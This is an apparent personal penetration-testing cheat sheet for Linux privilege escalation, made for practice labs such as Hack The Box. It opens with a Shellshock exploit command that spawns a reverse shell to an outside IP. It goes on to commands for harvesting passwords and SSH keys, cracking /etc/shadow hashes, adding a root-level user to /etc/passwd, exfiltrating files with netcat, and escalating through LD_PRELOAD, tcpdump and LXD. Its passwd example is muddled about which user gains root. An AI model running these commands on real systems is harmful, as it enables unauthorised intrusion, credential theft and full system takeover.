# Remote Priv Esc

## Shell Shock 

* spot /cgi-bin
* dirbust .sh .cgi or some more exotic script files in it 
* use 34766.php

`php 34766.php -u http://shocker.htb/cgi-bin/user.sh -c "sh -i >& /dev/tcp/10.10.14.18/443 0>&1" `

# Local Priv Esc: General Info and Approach

* Generally you end up in restricted user account or shell
* You can almost always write to `/tmp` folder

* Linux Privilege escalation can be performed using following options:

1. Disclosed passwords or other credentials allowing direct accont hijacking
2. sudo misconfigurations or vulnerabilities
3. SUID or SGID misconfigurations
4. Write on root owned files
5. Cron services misconfigurations
6. Services ran as root
7. Kernel Exploits
8. Using enumeration scripts

# Using enumeration scripts

https://github.com/carlospolop/PEASS-ng/releases/
https://github.com/rebootuser/LinEnum
https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
https://payatu.com/guide-linux-privilege-escalation

# Disclosed passwords or other credentials

* If it is webserver, first thing is to look for database credentials
```
cd config

grep -Ri password .
```

* Finding passwords using bash
```
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

* Finding passwords using linenum
```
./LinEnum.sh -k password
```

* Finding ssh keys

```
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```

* Advanced: SSH-DSS process
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#ssh-key-predictable-prng-authorized_keys-process




# SUID or SGID misconfigurations

If s-bit is set, it allows running the program as the owner.
Sometimes those programs can be vulnerable or tricked into executing some malicious code.

1. Find SUID or SGID files

For SUID:
`find . -perm /4000 2>/dev/null`

For SGID:
`find . -perm /2000 2>/dev/null`

For both (preferred way):
`find / -perm -u=s -type f 2>/dev/null`

2. Exploit SUID

* use `strings` to identify use command within SUID file 
* Always use elf payload for exploiting SUID



# Write on root owned files

# Cron services misconfigurations

```
ls -la /etc/cron.daily/
```
# = ID

m = Minute

h = Hour

dom = Day of the month

mon = Month

dow = Day of the week

user = What user the command will run as

command = What command should be run

For Example,

   m   h dom mon dow user  command

17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly



# Utilities
This should help inside the system.

## System recon

1. List processes run as root:
`ps aux | grep root`

OR/AND use `pspy` to scout running processes https://github.com/DominicBreuker/pspy

2. Search history:
`history`

3. Search home directories:
`ls -la /home`
`ls -la ~/.ssh`

4. See sudo permissions (password may be needed):
`sudo -l`

5. search for config files

`find / -iname *.config 2>/dev/null`

6. Grab password hashes

shadow file /etc/shadow or /etc/passwd

In passwd you may find something like this: sysadm:$6$vdH7vuQIv6anIBWg$Ysk.UZzI7WxYUBYt8WRIWF0EzWlksOElDE0HLYinee38QI1A.0HW7WZCrUhZ9wwDz13bPpkTjNuRoUGYhwFE11:1007:1007::/home/sysadm:

Cracking the hash:

```
# $6$ stands for sha512

hashcat -h | grep sha512

hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

```

7. Exploit unmounted drives to find sensitive information

`lsblk`

8. Find writable directories and files:
`find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`
`find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`

9. Kernel exploit

`uname -a`
`lsb_release -a`

Very good collection of nix exploits: https://github.com/FuzzySecurity/Unix-PrivEsc

## File transfering 

* scp
* socat
* wget
* nc
```
#start listener
nc -lvnp 80 > output.txt

#start sender
nc -nv listener_ip 80 < input.txt

#wait some time depending on file size: 10 seconds to 10 minutes...
cat output.txt
```
## Breaking out of restricted shell

### vim

breaking out using vim 
```
vim
:set shell=/bin/sh
:shell
```

# /etc/passwd

## The structure of the passwd file is as follows

<code> oracle:x:1021:1021:Oracle Services:/data/network/oracle:/bin/bash </code>

* Each line of the passwd file represents a set of parameters belonging to a user
* Parameters are separated with :
* Each parameter position is described below (source: [cyberciti](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/))

1. **Username**: It is used when user logs in. It should be between 1 and 32 characters in length.
2. **Password**: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to computes the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file. Password hash may also be present here for backward compatibility, but it precedes the one in shadow file.
3. **User ID** (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
4. **Group ID** (GID): The primary group ID (stored in /etc/group file)
5. **User ID Info** (GECOS): The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
6. **Home directory**: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
7. **Command/shell**: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell. For example, sysadmin can use the nologin shell, which acts as a replacement shell for the user accounts. If shell set to /sbin/nologin and the user tries to log in to the Linux system directly, the /sbin/nologin shell closes the connection.

## Use of passwd for privilege escalation

* privilege escalation on Linux may make use of passwd file if something can be appended to it (perform recon)
* For example kernel exploit can be compiled to execute arbitrary command to add a line to passwd file as root to make a hidden user with admin rights...

So to **make oracle user root account**, it is sufficient to add following line

<code> tester:x:0:0::/:/bin/bash </code>

Instead of 1021, we got UID and GID 0, which corresponds to root account. So user orcale is root now.

Additionally one may generate a password hash with crypt function and add it the second position instead of x. 

`openssl passwd -1`

<code> pentester:$1$2AL4ULeB$vPb2hnoy5xgsBueJSXTsj0:0:0::/:/bin/bash </code>
Password1

# Shadow file hash cracking/adding

Generate shadow files ([stackoverflow](https://unix.stackexchange.com/questions/81240/manually-generate-password-for-etc-shadow)):

<code> openssl passwd -6 -salt xyz  yourpass </code>

Note: passing -1 will generate an MD5 password, -5 a SHA256 and -6 SHA512 (recommended)

To understand which hash you need, check what is $X$:

username:$X$salt$pass....

* $1$ is MD5
* $2a$ is Blowfish
* $2y$ is Blowfish
* $5$ is SHA-256
* $6$ is SHA-512

AND dont forget salt!

# Diverse

* Supress messages from background process

<code>  bg_proc > /dev/null 2>&1 &   </code>

```bash 
ps aux | grep root	See processes running as root
ps au	See logged in users
ls /home	View user home directories
ls -l ~/.ssh	Check for SSH keys for current user
history	Check the current user's Bash history
sudo -l	Can the user run anything as another user?
ls -la /etc/cron.daily	Check for daily Cron jobs
lsblk	Check for unmounted file systems/drives
find / -perm -002 -type d 2>/dev/null Find world writeable directories
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null	Find world-writeable directories
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null	Find world-writeable files
uname -a	Check the Kernel versiion
cat /etc/lsb-release	Check the OS version
gcc kernel_expoit.c -o kernel_expoit	Compile an exploit written in C
screen -v	Check the installed version of Screen
./pspy64 -pf -i 1000	View running processes with pspy
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null	Find binaries with the SUID bit set
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null	Find binaries with the SETGID bit set
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root	Priv esc with tcpdump
echo $PATH	Check the current user's PATH variable contents
PATH=.:${PATH}	Add a . to the beginning of the current user's PATH
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null	Search for config files
ldd /bin/ls	View the shared objects required by a binary
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart	Escalate privileges using LD_PRELOAD
readelf -d payroll | grep PATH	Check the RUNPATH of a binary
gcc src.c -fPIC -shared -o /development/libshared.so	Compiled a shared libary
lxd init	Start the LXD initialization process
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine	Import a local image
lxc init alpine r00t -c security.privileged=true	Start a privileged LXD container
lxc config device add r00t mip a
ydev disk source=/ path=/mnt/root recursive=true	Mount the host file system in a container
lxc start r00t	Start the container
showmount -e 10.129.2.12	Show the NFS export list
sudo mount -t nfs 10.129.2.12:/tmp /mnt	Mount an NFS share locally
tmux -S /shareds new -s debugsess	Created a shared tmux session socket
./lynis audit system	Perform a system audit with Lynis
```

## Post Exploitation

https://guif.re/linuxeop#Post%20exploitation